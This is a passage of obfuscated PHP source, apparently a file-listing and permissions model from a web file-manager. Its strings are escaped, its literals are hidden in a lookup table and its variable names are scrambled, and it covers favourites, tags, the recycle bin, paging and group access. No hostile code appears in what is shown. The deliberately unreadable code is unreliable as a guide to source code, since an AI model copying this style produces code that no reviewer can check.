"\x69\157\137\163\157\165\x72\x63\145\137\155\145\x74\141", "\x6d\145\164\x61\x46\x69\x65\x6c\x64" => "\x73\x6f\x75\x72\x63\x65\x49\104"); protected $dataAuto = array(array("\x6d\157\x64\x69\146\171\124\x69\155\145", "\164\151\155\145", "\151\156\163\x65\x72\164", "\x66\x75\156\x63\164\151\x6f\x6e"), array("\143\x72\145\x61\x74\145\124\x69\155\145", "\x74\151\x6d\145", "\x69\156\x73\145\162\x74", "\x66\x75\x6e\x63\164\151\x6f\156"), array("\x76\151\x65\167\x54\x69\155\x65", "\x74\x69\x6d\145", "\x69\x6e\x73\145\x72\x74", "\x66\165\156\143\164\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($»à¦äË) { return $this->listSource(array($_SERVER[¯‘·½][479] => $»à¦äË)); } public function typeName($´ÀÖƒì¹) { static $·¤ü·Ø½ = array(self::TYPE_SYSTEM => "\163\171\163\x74\x65\155", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\x67\162\157\165\x70"); return $·¤ü·Ø½[$´ÀÖƒì¹ . $_SERVER[¯‘·½][12]]; } public function sourceListInfo($®¸‚çÔ‚, $í†³æ² = false) { $¾ÙÔ®éÃ =& $_SERVER[¯‘·½]; $®¸‚çÔ‚ = $®¸‚çÔ‚ ? $®¸‚çÔ‚ : array(); $®¸‚çÔ‚ = array_filter(array_unique($®¸‚çÔ‚)); if (!$®¸‚çÔ‚) { return array(); } $¥Ù¡š³´ = $this->where(array($¾ÙÔ®éÃ[194] => array($¾ÙÔ®éÃ[7], $®¸‚çÔ‚)))->select(); $this->_listDataApply($¥Ù¡š³´, $í†³æ²); return array_to_keyvalue($¥Ù¡š³´, $¾ÙÔ®éÃ[194]); } public function pathInfoFilter(&$ÏÏÌó„ú) { $´È’‚‚Ü =& $_SERVER[¯‘·½]; static $ç“‘¯É = false; static $×ßñÆ™ = false; static $Å¸’ŞÇÑ = false; if (!$ç“‘¯É) { $À‹ü³ØÆ = $´È’‚‚Ü[480]; $À‹ü³ØÆ .= $´È’‚‚Ü[481]; $À‹ü³ØÆ .= $´È’‚‚Ü[482]; $Úß©Åí’ = $´È’‚‚Ü[483]; $ÍîÔçŞş = explode($´È’‚‚Ü[50], $Úß©Åí’); $ç“‘¯É = explode($´È’‚‚Ü[50], $À‹ü³ØÆ); $×ßñÆ™ = array(); foreach ($ç“‘¯É as $Î–»ÖÛ¼) { if (in_array($Î–»ÖÛ¼, $ÍîÔçŞş)) { continue; } $×ßñÆ™[] = $Î–»ÖÛ¼; } $Å¸’ŞÇÑ = explode($´È’‚‚Ü[50], $´È’‚‚Ü[484]); } foreach ($Å¸’ŞÇÑ as $ Ğ’Øˆ) { if (isset($ÏÏÌó„ú[$ Ğ’Øˆ])) { $ÏÏÌó„ú[$ Ğ’Øˆ] = intval($ÏÏÌó„ú[$ Ğ’Øˆ]); } } $ÏÏÌó„ú[$´È’‚‚Ü[87]] = $´È’‚‚Ü[485] . $ÏÏÌó„ú[$´È’‚‚Ü[194]] . $´È’‚‚Ü[486]; $ÏÏÌó„ú[$´È’‚‚Ü[33]] = $ÏÏÌó„ú[$´È’‚‚Ü[487]] == 1 ? $´È’‚‚Ü[78] : $´È’‚‚Ü[233]; $ÏÏÌó„ú[$´È’‚‚Ü[191]] = $this->typeName($ÏÏÌó„ú[$´È’‚‚Ü[191]]); if ($ÏÏÌó„ú[$´È’‚‚Ü[487]] != 1) { $ÏÏÌó„ú[$´È’‚‚Ü[169]] = $ÏÏÌó„ú[$´È’‚‚Ü[488]]; unset($ÏÏÌó„ú[$´È’‚‚Ü[488]]); } $£×˜ú— = $ç“‘¯É; if (isset($ÏÏÌó„ú[$´È’‚‚Ü[489]]) && $ÏÏÌó„ú[$´È’‚‚Ü[489]][$´È’‚‚Ü[490]] == -1) { $£×˜ú— = $×ßñÆ™; } $ÏÏÌó„ú = array_field_key($ÏÏÌó„ú, $£×˜ú—); return $ÏÏÌó„ú; } public function listUserFav() { $ûûˆóÈ¿ =& $_SERVER[¯‘·½]; $£¡„Ôğ‰ = Model($ûûˆóÈ¿[491])->listData(); $‡…½¬ëá = array_filter_by_field($£¡„Ôğ‰, $ûûˆóÈ¿[33], $ûûˆóÈ¿[492]); $‡…½¬ëá = array_to_keyvalue($‡…½¬ëá, $ûûˆóÈ¿[12], $ûûˆóÈ¿[87]); if ($‡…½¬ëá) { $œ¼Îõá = $this->listSource(array($ûûˆóÈ¿[493] => array($ûûˆóÈ¿[494], $‡…½¬ëá))); } $œ¼Îõá = array_to_keyvalue($œ¼Îõá[$ûûˆóÈ¿[447]], $ûûˆóÈ¿[194]); foreach ($£¡„Ôğ‰ as &$ÜĞ¥Ùû) { $ÜĞ¥Ùû = array($ûûˆóÈ¿[495] => $ÜĞ¥Ùû[$ûûˆóÈ¿[477]], $ûûˆóÈ¿[496] => $ÜĞ¥Ùû[$ûûˆóÈ¿[32]], $ûûˆóÈ¿[497] => $ÜĞ¥Ùû[$ûûˆóÈ¿[87]], $ûûˆóÈ¿[498] => $ÜĞ¥Ùû[$ûûˆóÈ¿[33]], $ûûˆóÈ¿[499] => $ÜĞ¥Ùû[$ûûˆóÈ¿[234]], $ûûˆóÈ¿[500] => $ÜĞ¥Ùû[$ûûˆóÈ¿[88]]); if ($ÜĞ¥Ùû[$ûûˆóÈ¿[33]] == $ûûˆóÈ¿[492] && $œ¼Îõá[$ÜĞ¥Ùû[$ûûˆóÈ¿[87]]]) { $ÜĞ¥Ùû[$ûûˆóÈ¿[90]] = $œ¼Îõá[$ÜĞ¥Ùû[$ûûˆóÈ¿[87]]]; } } unset($ÜĞ¥Ùû); return $£¡„Ôğ‰; } public function listUserTag($Õ¹ì±ëÚ) { $«¯•Íİ¹ =& $_SERVER[¯‘·½]; if ($Õ¹ì±ëÚ && !is_array($Õ¹ì±ëÚ)) { $Õ¹ì±ëÚ = array($Õ¹ì±ëÚ); } $çÖçü‡ = Model($«¯•Íİ¹[501])->listData(); $Òó²ÁØ” = array(); $úÀÒÅÖ = array(); foreach ($çÖçü‡ as $‡şğõ…æ) { $°ãÁî¶‹ = $‡şğõ…æ[$«¯•Íİ¹[87]]; if (!$°ãÁî¶‹) { continue; } if (!isset($úÀÒÅÖ[$°ãÁî¶‹])) { $úÀÒÅÖ[$°ãÁî¶‹] = array(); } $úÀÒÅÖ[$°ãÁî¶‹][] = $‡şğõ…æ[$«¯•Íİ¹[502]]; $Òó²ÁØ”[$‡şğõ…æ[$«¯•Íİ¹[87]]] = $‡şğõ…æ; } $˜¾ÕÂøœ = array(); $À»¶ˆ«º = array(); $î«š˜¼¨ = array(); foreach ($úÀÒÅÖ as $àŠ‚á¡± => $Õ„¸ê»Š) { $ğšï„— = !0; if (!$Õ¹ì±ëÚ) { $˜¾ÕÂøœ[] = $àŠ‚á¡±; continue; } foreach ($Õ¹ì±ëÚ as $ñ¬ù³ù›) { if (!in_array($ñ¬ù³ù›, $Õ„¸ê»Š)) { $ğšï„— = !1; break; } } if (!$ğšï„—) { continue; } if (!is_numeric($àŠ‚á¡±)) { $Šˆº—œ = $Òó²ÁØ”[$àŠ‚á¡±]; $–ØéşŒ° = array($«¯•Íİ¹[32] => $Šˆº—œ[$«¯•Íİ¹[32]], $«¯•Íİ¹[87] => $Šˆº—œ[$«¯•Íİ¹[87]], $«¯•Íİ¹[33] => $Šˆº—œ[$«¯•Íİ¹[33]], $«¯•Íİ¹[90] => array($«¯•Íİ¹[503] => 1), $«¯•Íİ¹[235] => !0); if ($Šˆº—œ[$«¯•Íİ¹[33]] == $«¯•Íİ¹[233]) { $î«š˜¼¨[] = $–ØéşŒ°; } if ($Šˆº—œ[$«¯•Íİ¹[33]] == $«¯•Íİ¹[78]) { $À»¶ˆ«º[] = $–ØéşŒ°; } continue; } $˜¾ÕÂøœ[] = $àŠ‚á¡±; } if ($˜¾ÕÂøœ) { $“ıÑÎªÕ = $this->listSource(array($«¯•Íİ¹[493] => array($«¯•Íİ¹[494], $˜¾ÕÂøœ))); } $“ıÑÎªÕ = $“ıÑÎªÕ ? $“ıÑÎªÕ : array($«¯•Íİ¹[85] => array(), $«¯•Íİ¹[86] => array()); $“ıÑÎªÕ[$«¯•Íİ¹[85]] = array_merge($“ıÑÎªÕ[$«¯•Íİ¹[85]], $À»¶ˆ«º); $“ıÑÎªÕ[$«¯•Íİ¹[86]] = array_merge($“ıÑÎªÕ[$«¯•Íİ¹[86]], $î«š˜¼¨); if (isset($“ıÑÎªÕ[$«¯•Íİ¹[444]]) && count($˜¾ÕÂøœ) == $“ıÑÎªÕ[$«¯•Íİ¹[444]][$«¯•Íİ¹[445]]) { return $“ıÑÎªÕ; } $Ğ «àÒé = array(); $§ãÁ¿Ø = array_to_keyvalue($“ıÑÎªÕ[$«¯•Íİ¹[85]], $«¯•Íİ¹[12], $«¯•Íİ¹[194]); $·‡ïüñğ = array_to_keyvalue($“ıÑÎªÕ[$«¯•Íİ¹[86]], $«¯•Íİ¹[12], $«¯•Íİ¹[194]); $–çÒÔäØ = array_merge($·‡ïüñğ, $§ãÁ¿Ø); foreach ($˜¾ÕÂøœ as $°ãÁî¶‹) { if (!in_array($°ãÁî¶‹, $–çÒÔäØ)) { $Ğ «àÒé[] = $°ãÁî¶‹; } } if ($Ğ «àÒé) { Model($«¯•Íİ¹[504])->removeBySource($Ğ «àÒé); } return $“ıÑÎªÕ; } public function listUserRecycle() { $ĞŸ¦‹¤£ =& $_SERVER[¯‘·½]; $Óà³¾½Ù = Model($ĞŸ¦‹¤£[505])->listData(); if (!$Óà³¾½Ù) { return array(); } $¦÷š¹ë¬ = array($ĞŸ¦‹¤£[493] => array($ĞŸ¦‹¤£[494], $Óà³¾½Ù), $ĞŸ¦‹¤£[506] => 1); return $this->listSource($¦÷š¹ë¬); } public function listSource($ı§Ì¯»ç, $ú¼§÷®Ú = 3000, $æŠõÚªæ = false) { $“™«¶è =& $_SERVER[¯‘·½]; if (!isset($ı§Ì¯»ç[$“™«¶è[507]])) { $ı§Ì¯»ç[$“™«¶è[507]] = 0; } if (isset($ı§Ì¯»ç[$“™«¶è[193]]) && $ı§Ì¯»ç[$“™«¶è[193]] == $“™«¶è[231]) { $ı§Ì¯»ç[$“™«¶è[488]] = array($“™«¶è[508], $“™«¶è[12]); } if (isset($ı§Ì¯»ç[$“™«¶è[193]])) { $ı§Ì¯»ç[$“™«¶è[193]] = intval($ı§Ì¯»ç[$“™«¶è[193]]); } $ÉŸÍƒ = $“™«¶è[509]; $Ó³åä´‚ = $this->field($ÉŸÍƒ)->_makeOrder()->where($ı§Ì¯»ç)->selectPage($ú¼§÷®Ú); $this->_listPageCheck($Ó³åä´‚, $ÉŸÍƒ, $ı§Ì¯»ç); $this->_listDataApply($Ó³åä´‚[$“™«¶è[447]], $æŠõÚªæ); $this->_listMake($Ó³åä´‚); return $Ó³åä´‚; } private function _listPageCheck(&$º¾Ç´¶‡, $¤ê±’É, $€ü÷‰‚) { $‹ú¹²ÑØ =& $_SERVER[¯‘·½]; if (!is_array($º¾Ç´¶‡[$‹ú¹²ÑØ[444]])) { return; } $±šö¾ä« = $º¾Ç´¶‡[$‹ú¹²ÑØ[444]]; if ($±šö¾ä«[$‹ú¹²ÑØ[446]] <= 1) { return; } if ($±šö¾ä«[$‹ú¹²ÑØ[445]] >= 100000) { return; } if (Model($‹ú¹²ÑØ[510])->get($‹ú¹²ÑØ[511]) != $‹ú¹²ÑØ[512]) { return; } $¤ê±’É = str_replace(array($‹ú¹²ÑØ[53], $‹ú¹²ÑØ[419], $‹ú¹²ÑØ[288]), $‹ú¹²ÑØ[12], $¤ê±’É); $¤ê±’É = $‹ú¹²ÑØ[513] . str_replace($‹ú¹²ÑØ[50], $‹ú¹²ÑØ[514], $¤ê±’É) . $‹ú¹²ÑØ[515]; $ù¤¢Îï× = $‹ú¹²ÑØ[516]; $ù¤¢Îï× = $ù¤¢Îï× . $‹ú¹²ÑØ[517]; $ÎÜ¢£Ø = $±šö¾ä«[$‹ú¹²ÑØ[441]] * ($±šö¾ä«[$‹ú¹²ÑØ[430]] - 1) . $‹ú¹²ÑØ[50] . $±šö¾ä«[$‹ú¹²ÑØ[441]]; $–¥™áùñ = $this->_makeOrder(!0); $µîñíò† = $‹ú¹²ÑØ[513] . str_replace($‹ú¹²ÑØ[50], $‹ú¹²ÑØ[514], $–¥™áùñ[0]); if (strpos($µîñíò†, $‹ú¹²ÑØ[518])) { $µîñíò† = str_replace($‹ú¹²ÑØ[518], $‹ú¹²ÑØ[519], $µîñíò†); } else { $µîñíò† .= $‹ú¹²ÑØ[520] . $–¥™áùñ[1]; } $›Ÿ³úÄ˜ = array(); foreach ($€ü÷‰‚ as $¡å‘è†è => $Õ˜øÁëø) { $›Ÿ³úÄ˜[$‹ú¹²ÑØ[513] . $¡å‘è†è] = $Õ˜øÁëø; } $this->alias($‹ú¹²ÑØ[521])->field($¤ê±’É)->limit($ÎÜ¢£Ø)->order($µîñíò†); $ÚÇ›Ú™Ì = $this->join($ù¤¢Îï×)->where($›Ÿ³úÄ˜)->select(); if ($ÚÇ›Ú™Ì) { $º¾Ç´¶‡[$‹ú¹²ÑØ[447]] = $ÚÇ›Ú™Ì; } } protected function _makeOrder($‹Ê¯ñÛ³ = false) { $¦É ¤í =& $_SERVER[¯‘·½]; $»÷ÙÜø = Model($¦É ¤í[522])->get($¦É ¤í[523]); $Ô£ŞÆ¿õ = Model($¦É ¤í[522])->get($¦É ¤í[524]); $Ò€–ú’Ü = array($¦É ¤í[525] => $¦É ¤í[526], $¦É ¤í[527] => $¦É ¤í[528]); $·õÖÜ€ö = array($¦É ¤í[32] => $¦É ¤í[32], $¦É ¤í[79] => $¦É ¤í[79], $¦É ¤í[169] => $¦É ¤í[488], $¦É ¤í[529] => $¦É ¤í[529], $¦É ¤í[530] => $¦É ¤í[531], $¦É ¤í[234] => $¦É ¤í[234], $¦É ¤í[88] => $¦É ¤í[88]); $ìÏ²ÙÔ = Input::get($¦É ¤í[532], $¦É ¤í[7], $»÷ÙÜø, array_keys($·õÖÜ€ö)); $—–Ù”‡¶ = Input::get($¦É ¤í[533], $¦É ¤í[7], $Ô£ŞÆ¿õ, array_keys($Ò€–ú’Ü)); if (!in_array($ìÏ²ÙÔ, array_keys($·õÖÜ€ö))) { $ìÏ²ÙÔ = $¦É ¤í[32]; } if (!in_array($—–Ù”‡¶, array_keys($Ò€–ú’Ü))) { $ìÏ²ÙÔ = $¦É ¤í[525]; } if ($ìÏ²ÙÔ == $¦É ¤í[32]) { } $ØâÒ¼Êœ = $¦É ¤í[534] . $·õÖÜ€ö[$ìÏ²ÙÔ] . $¦É ¤í[53] . $Ò€–ú’Ü[$—–Ù”‡¶]; $ØâÒ¼Êœ = rtrim(trim($ØâÒ¼Êœ), $¦É ¤í[50]); if ($‹Ê¯ñÛ³) { return array($ØâÒ¼Êœ, $Ò€–ú’Ü[$—–Ù”‡¶]); } return $this->order($ØâÒ¼Êœ); } protected function _listDataApplyItem($Õƒë–îÖ, $˜æ‰ˆ¼± = false) { $¡´æã”Œ = array($Õƒë–îÖ); $this->_listDataApply($¡´æã”Œ, $˜æ‰ˆ¼±); return $¡´æã”Œ[0]; } protected function _listDataApply(&$€ÌÈğ›ß, $ìÍ½Ê’ = false) { $µ¥Ò¾­™ =& $_SERVER[¯‘·½]; if (!$€ÌÈğ›ß) { $€ÌÈğ›ß = array(); return; } $›ÜĞáøú = array_to_keyvalue($€ÌÈğ›ß, $µ¥Ò¾­™[12], $µ¥Ò¾­™[194]); $›ÜĞáøú = array_unique($›ÜĞáøú); $›ÜĞáøú = array_to_int($›ÜĞáøú); $this->_listSourceCache($€ÌÈğ›ß); if (!$ìÍ½Ê’) { $this->_listAppendMeta($€ÌÈğ›ß, $›ÜĞáøú); $this->_listAppendFileMeta($€ÌÈğ›ß, $›ÜĞáøú); $this->_listAppendChildren($€ÌÈğ›ß, $›ÜĞáøú); } $this->_listAppendPath($€ÌÈğ›ß); $this->_listAppendAuth($€ÌÈğ›ß); $this->_listAppendSourceInfo($€ÌÈğ›ß, $›ÜĞáøú); $this->_listAppendUser($€ÌÈğ›ß); $this->_listFilterInfo($€ÌÈğ›ß, $ìÍ½Ê’); $this->_listAppendAuthSecret($€ÌÈğ›ß); } protected function _listSourceCache($ÔË‚´Ö¯) { $‰«´£ºã =& $_SERVER[¯‘·½]; foreach ($ÔË‚´Ö¯ as $ö«í¤ã) { self::$cacheSourceInfo[$‰«´£ºã[535] . $ö«í¤ã[$‰«´£ºã[194]]] = $ö«í¤ã; } } protected function _listFilterInfo(&$ØÓ³´‡, $¿Ş±òª¼ = false) { $«–üÛì =& $_SERVER[¯‘·½]; foreach ($ØÓ³´‡ as &$€‡íº¼) { $€‡íº¼ = $this->pathInfoFilter($€‡íº¼); self::$cachePathInfo[$«–üÛì[536] . intval($¿Ş±òª¼) . $«–üÛì[464] . $€‡íº¼[$«–üÛì[194]]] = $€‡íº¼; } unset($€‡íº¼); } protected function _listMake(&$Íô×¤’›) { $è‡ÕØšû =& $_SERVER[¯‘·½]; $Íô×¤’›[$è‡ÕØšû[85]] = array(); $Íô×¤’›[$è‡ÕØšû[86]] = array(); foreach ($Íô×¤’›[$è‡ÕØšû[447]] as $íÌêİµ) { $úµÆ²º = $íÌêİµ[$è‡ÕØšû[487]] == 1 ? $è‡ÕØšû[85] : $è‡ÕØšû[86]; $Íô×¤’›[$úµÆ²º][] = $íÌêİµ; } unset($Íô×¤’›[$è‡ÕØšû[447]]); } protected function _listAppendMeta(&$À€ÕŠ¬Ò, $ºßˆéÛ±) { $ŸıÃôô =& $_SERVER[¯‘·½]; $åÇ–ùÚØ = array($ŸıÃôô[493] => array($ŸıÃôô[494], $ºßˆéÛ±)); $³ñêŸş = Model($ŸıÃôô[537])->field($ŸıÃôô[538])->where($åÇ–ùÚØ)->select(); if (!$³ñêŸş) { return; } $éìà›Û = array($ŸıÃôô[539], $ŸıÃôô[540], $ŸıÃôô[519]); $å°óÕ¦ = array(); foreach ($³ñêŸş as $Ãµ˜íë) { if (!isset($å°óÕ¦[$Ãµ˜íë[$ŸıÃôô[194]]])) { $å°óÕ¦[$Ãµ˜íë[$ŸıÃôô[194]]] = array(); } if (in_array($Ãµ˜íë[$ŸıÃôô[97]], $éìà›Û)) { continue; } if ($Ãµ˜íë[$ŸıÃôô[97]] == $ŸıÃôô[541]) { $Ãµ˜íë[$ŸıÃôô[452]] = $ŸıÃôô[542]; } $å°óÕ¦[$Ãµ˜íë[$ŸıÃôô[194]]][$Ãµ˜íë[$ŸıÃôô[97]]] = $Ãµ˜íë[$ŸıÃôô[452]]; } foreach ($À€ÕŠ¬Ò as &$Óä”–…’) { $Óä”–…’[$ŸıÃôô[543]] = !1; if (isset($å°óÕ¦[$Óä”–…’[$ŸıÃôô[194]]])) { $Óä”–…’[$ŸıÃôô[543]] = $å°óÕ¦[$Óä”–…’[$ŸıÃôô[194]]]; } if ($this->fileIsLock($Óä”–…’) && $Óä”–…’[$ŸıÃôô[489]]) { $¢£Ó”œÉ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Óä”–…’[$ŸıÃôô[489]][$ŸıÃôô[490]] = AuthModel::authDisable($Óä”–…’[$ŸıÃôô[489]][$ŸıÃôô[490]], $¢£Ó”œÉ); $Óä”–…’[$ŸıÃôô[489]][$ŸıÃôô[544]][$ŸıÃôô[489]] = $Óä”–…’[$ŸıÃôô[489]][$ŸıÃôô[490]]; } } unset($Óä”–…’); } protected function _listAppendFileMeta(&$ÂÛ™¨¼Ø, $Œ‹¦æÉÖ) { $â¼”‘  =& $_SERVER[¯‘·½]; $ºšÜÙ¦Ù = array_to_keyvalue($ÂÛ™¨¼Ø, $â¼”‘ [12], $â¼”‘ [545]); $ºšÜÙ¦Ù = array_filter(array_unique($ºšÜÙ¦Ù)); $ºšÜÙ¦Ù = array_to_int($ºšÜÙ¦Ù); if (!$ºšÜÙ¦Ù) { return; } $ÃêÇß•— = array($â¼”‘ [546] => array($â¼”‘ [494], $ºšÜÙ¦Ù)); $‹Ï¢ÌíÅ = $â¼”‘ [547]; $ªÎˆÔĞ = Model($â¼”‘ [548])->field($‹Ï¢ÌíÅ)->where($ÃêÇß•—)->select(); $ªÎˆÔĞ = array_to_keyvalue($ªÎˆÔĞ, $â¼”‘ [545]); $û¹›øÑÈ = Model($â¼”‘ [549])->field($â¼”‘ [550])->where($ÃêÇß•—)->select(); $û¹›øÑÈ = $û¹›øÑÈ ? $û¹›øÑÈ : array(); $­éæ÷Ì­ = array(); foreach ($û¹›øÑÈ as $ÈäÓ²Ø) { if (!isset($­éæ÷Ì­[$ÈäÓ²Ø[$â¼”‘ [545]]])) { $­éæ÷Ì­[$ÈäÓ²Ø[$â¼”‘ [545]]] = array(); } $­éæ÷Ì­[$ÈäÓ²Ø[$â¼”‘ [545]]][$ÈäÓ²Ø[$â¼”‘ [97]]] = $ÈäÓ²Ø[$â¼”‘ [452]]; } foreach ($ÂÛ™¨¼Ø as &$„á¿øšô) { $”»Å’Ä¼ = $„á¿øšô[$â¼”‘ [545]]; if (!$”»Å’Ä¼ || !is_array($ªÎˆÔĞ[$”»Å’Ä¼])) { continue; } $…˜‚°ªŠ = $ªÎˆÔĞ[$”»Å’Ä¼]; $…˜‚°ªŠ[$â¼”‘ [79]] = $„á¿øšô[$â¼”‘ [79]]; $…˜‚°ªŠ[$â¼”‘ [32]] = $„á¿øšô[$â¼”‘ [32]]; if (!$…˜‚°ªŠ[$â¼”‘ [551]]) { Model($â¼”‘ [548])->fileMd5Check($…˜‚°ªŠ); } if (!isset(self::$cacheFileInfo[$â¼”‘ [552] . $”»Å’Ä¼])) { self::$cacheFileInfo[$â¼”‘ [552] . $”»Å’Ä¼] = array_merge(array(), $…˜‚°ªŠ); } unset($ªÎˆÔĞ[$”»Å’Ä¼][$â¼”‘ [87]]); $°¾ª” = isset($­éæ÷Ì­[$”»Å’Ä¼]) && is_array($­éæ÷Ì­[$”»Å’Ä¼]) ? $­éæ÷Ì­[$”»Å’Ä¼] : array(); $„á¿øšô[$â¼”‘ [170]] = array_merge($°¾ª”, $ªÎˆÔĞ[$”»Å’Ä¼]); if (isset($„á¿øšô[$â¼”‘ [170]][$â¼”‘ [185]])) { $„á¿øšô[$â¼”‘ [185]] = json_decode($„á¿øšô[$â¼”‘ [170]][$â¼”‘ [185]], !0); unset($„á¿øšô[$â¼”‘ [170]][$â¼”‘ [185]]); } } unset($„á¿øšô); } protected function _listAppendSourceInfo(&$êß¨¤³, $¯åëæ¹) { $¾íÂÅƒ‘ =& $_SERVER[¯‘·½]; $Ò—•Ğ—ó = Model($¾íÂÅƒ‘[553])->listData(); $’ªÔŒÌ± = Model($¾íÂÅƒ‘[501])->listData(); $ÏÏ¼Şİ = Model($¾íÂÅƒ‘[491])->listData(); $Ä¶Ñ‡¾ê = Model($¾íÂÅƒ‘[554])->listSimple(); $àÛğˆşĞ = array_to_keyvalue($Ò—•Ğ—ó, $¾íÂÅƒ‘[477]); $´Şô·¡ = array_to_keyvalue_group($’ªÔŒÌ±, $¾íÂÅƒ‘[87], $¾íÂÅƒ‘[502]); $‡¤ÉÀ· = array_to_keyvalue($ÏÏ¼Şİ, $¾íÂÅƒ‘[87]); $÷ê‚–¤ = array_to_keyvalue_group($Ä¶Ñ‡¾ê, $¾íÂÅƒ‘[194]); foreach ($êß¨¤³ as &$ºìÍ¸ˆ) { $ºìÍ¸ˆ[$¾íÂÅƒ‘[90]] = array($¾íÂÅƒ‘[555] => 0, $¾íÂÅƒ‘[556] => 0, $¾íÂÅƒ‘[557] => 0); if (isset($‡¤ÉÀ·[$ºìÍ¸ˆ[$¾íÂÅƒ‘[194]]])) { $ºìÍ¸ˆ[$¾íÂÅƒ‘[90]][$¾íÂÅƒ‘[558]] = 1; $ºìÍ¸ˆ[$¾íÂÅƒ‘[90]][$¾íÂÅƒ‘[559]] = $‡¤ÉÀ·[$ºìÍ¸ˆ[$¾íÂÅƒ‘[194]]][$¾íÂÅƒ‘[32]]; } if ($´Şô·¡ && $àÛğˆşĞ && isset($´Şô·¡[$ºìÍ¸ˆ[$¾íÂÅƒ‘[194]]])) { $ºìÍ¸ˆ[$¾íÂÅƒ‘[90]][$¾íÂÅƒ‘[560]] = array(); foreach ($´Şô·¡[$ºìÍ¸ˆ[$¾íÂÅƒ‘[194]]] as $¢˜à÷Ô¢) { $¶àõüœ¾ = $àÛğˆşĞ[$¢˜à÷Ô¢]; $ºìÍ¸ˆ[$¾íÂÅƒ‘[90]][$¾íÂÅƒ‘[560]][] = array($¾íÂÅƒ‘[561] => $¶àõüœ¾[$¾íÂÅƒ‘[477]], $¾íÂÅƒ‘[496] => $¶àõüœ¾[$¾íÂÅƒ‘[32]], $¾íÂÅƒ‘[562] => $¶àõüœ¾[$¾íÂÅƒ‘[563]]); } } if ($÷ê‚–¤ && isset($÷ê‚–¤[$ºìÍ¸ˆ[$¾íÂÅƒ‘[194]]])) { $ºìÍ¸ˆ[$¾íÂÅƒ‘[90]][$¾íÂÅƒ‘[564]] = array(); foreach ($÷ê‚–¤[$ºìÍ¸ˆ[$¾íÂÅƒ‘[194]]] as $‹‰¬ÀêÌ) { $ÌúäÔç² = $¾íÂÅƒ‘[565]; if ($‹‰¬ÀêÌ[$¾íÂÅƒ‘[566]] == $¾íÂÅƒ‘[91]) { $ÌúäÔç² .= $¾íÂÅƒ‘[567]; } $ºìÍ¸ˆ[$¾íÂÅƒ‘[90]][$¾íÂÅƒ‘[564]] = array_field_key($‹‰¬ÀêÌ, explode($¾íÂÅƒ‘[50], $ÌúäÔç²)); } } } unset($ºìÍ¸ˆ); return $êß¨¤³; } protected function _listAppendChildren(&$µ™¾×æŞ, $Âİ¿ïÅı) { $Ü€Ìü²‹ =& $_SERVER[¯‘·½]; $Çù‹ãô = array(); $¬€éËÃÎ = array($Ü€Ìü²‹[242] => 0, $Ü€Ìü²‹[243] => 0); foreach ($µ™¾×æŞ as &$Å«¢üš­) { if (!$Å«¢üš­[$Ü€Ìü²‹[487]]) { continue; } $Çù‹ãô[] = intval($Å«¢üš­[$Ü€Ìü²‹[194]]); } unset($Å«¢üš­); if (!$Çù‹ãô) { return; } $»»¶°À = array($Ü€Ìü²‹[193] => array($Ü€Ìü²‹[7], $Çù‹ãô), $Ü€Ìü²‹[507] => 0); $«Ùİ†Ì = array($Ü€Ìü²‹[193], $Ü€Ìü²‹[487], $Ü€Ìü²‹[568] => $Ü€Ìü²‹[569]); $€ŞÊ’ÛÉ = $this->field($«Ùİ†Ì)->where($»»¶°À)->group($Ü€Ìü²‹[570])->select(); $Áİà¼Å™ = array(); foreach ($€ŞÊ’ÛÉ as $½¦Î¿Äø) { $ºúİÙÕ‘ = $½¦Î¿Äø[$Ü€Ìü²‹[193]]; $¼àĞ²¥Ä = $½¦Î¿Äø[$Ü€Ìü²‹[487]] == $Ü€Ìü²‹[91] ? $Ü€Ìü²‹[243] : $Ü€Ìü²‹[242]; if (!isset($Áİà¼Å™[$ºúİÙÕ‘])) { $Áİà¼Å™[$ºúİÙÕ‘] = array($Ü€Ìü²‹[242] => 0, $Ü€Ìü²‹[243] => 0); } $Áİà¼Å™[$ºúİÙÕ‘][$¼àĞ²¥Ä] += $½¦Î¿Äø[$Ü€Ìü²‹[569]]; } foreach ($µ™¾×æŞ as &$Å«¢üš­) { if (!$Å«¢üš­[$Ü€Ìü²‹[487]]) { continue; } $ú¾‡©È = is_array($Áİà¼Å™[$Å«¢üš­[$Ü€Ìü²‹[194]]]) ? $Áİà¼Å™[$Å«¢üš­[$Ü€Ìü²‹[194]]] : $¬€éËÃÎ; $Å«¢üš­[$Ü€Ìü²‹[243]] = $ú¾‡©È[$Ü€Ìü²‹[243]]; $Å«¢üš­[$Ü€Ìü²‹[242]] = $ú¾‡©È[$Ü€Ìü²‹[242]]; unset($Å«¢üš­[$Ü€Ìü²‹[488]]); } unset($Å«¢üš­); } protected function _listAppendAuth(&$½‚¾“øĞ) { $¨Ëª¸Œä =& $_SERVER[¯‘·½]; $°•¼“Ï® = array(); foreach ($½‚¾“øĞ as $ÀÇ®¸Ñ) { if ($ÀÇ®¸Ñ[$¨Ëª¸Œä[191]] == self::TYPE_GROUP) { $°•¼“Ï®[] = intval($ÀÇ®¸Ñ[$¨Ëª¸Œä[194]]); } } if (!$°•¼“Ï®) { return; } $µÑìÎ·¼ = array_to_keyvalue($½‚¾“øĞ, $¨Ëª¸Œä[194]); $â€ü®­ô = Model($¨Ëª¸Œä[571])->getSourceList($°•¼“Ï®, $µÑìÎ·¼); $º˜çàË = KodUser::isRoot(); foreach ($½‚¾“øĞ as $Ûç°ëœà => &$ÀÇ®¸Ñ) { $ÀÇ®¸Ñ[$¨Ëª¸Œä[489]] = $â€ü®­ô[$ÀÇ®¸Ñ[$¨Ëª¸Œä[194]]]; if (!$ÀÇ®¸Ñ[$¨Ëª¸Œä[489]] && $ÀÇ®¸Ñ[$¨Ëª¸Œä[191]] == self::TYPE_GROUP) { $ÀÇ®¸Ñ[$¨Ëª¸Œä[489]] = Action($¨Ëª¸Œä[572])->pathGroupAuthMake($ÀÇ®¸Ñ[$¨Ëª¸Œä[573]]); if (!$ÀÇ®¸Ñ[$¨Ëª¸Œä[489]] && !$º˜çàË) { $ÀÇ®¸Ñ[$¨Ëª¸Œä[236]] = !1; $ÀÇ®¸Ñ[$¨Ëª¸Œä[235]] = !1; } } if ($ÀÇ®¸Ñ[$¨Ëª¸Œä[489]]) { 